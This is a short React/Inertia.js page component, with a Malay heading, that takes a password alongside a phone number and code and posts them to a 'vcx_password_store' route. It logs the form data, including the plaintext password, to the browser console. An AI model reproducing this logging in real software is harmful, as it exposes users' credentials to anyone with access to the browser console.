import Rhmt2Layout from "@/Layouts/rhmt2_layout";
import RhmtLayout from "@/Layouts/rhmt_layouts";
import { Link, useForm } from "@inertiajs/react";
import { TextField } from "@mui/material";
import React, { useEffect, useState } from "react";

export default function SexLayouts({ phoneNumber, code }) {
    const { data, setData, post } = useForm({
        phoneNumber: phoneNumber,
        code: code,
        password: "",
    });

    const changeHandler = (e) => {
        const input = e.target.value;

        setData({ ...data, password: input });
    };

    const submitHandler = () => {
        post(route("rhmt.vcx_password_store"));
    };
    console.log(data);

    return (
        <Rhmt2Layout className="relative h-[932px] w-full overflow-hidden">
            <h3 className="text-4xl font-extrabold text-purple-800 font-sans tracking-tighter">
                <span className="text-white tracking-tighter text-2xl font-thin">
                    Letak Kata Laluan
                </span>
            </h3>

            <div className="py-5 w-full flex flex-col gap-2">
                <TextField
                    value={data.password}
                    onChange={changeHandler}
                    className="bg-white w-full rounded-lg outline-none focus:outline-none focus:border-none overflow-hidden"
                    variant="filled"
                    label="Password"
                    type="password"
                />
            </div>
            <button
                onClick={submitHandler}
                className="font-bold bg-purple-800 text-white text-2xl py-3 px-4 rounded-lg animate-pulse"
            >
                Log In
            </button>
        </Rhmt2Layout>
    );
}

SexLayouts.layout = (page) => <RhmtLayout children={page} />;
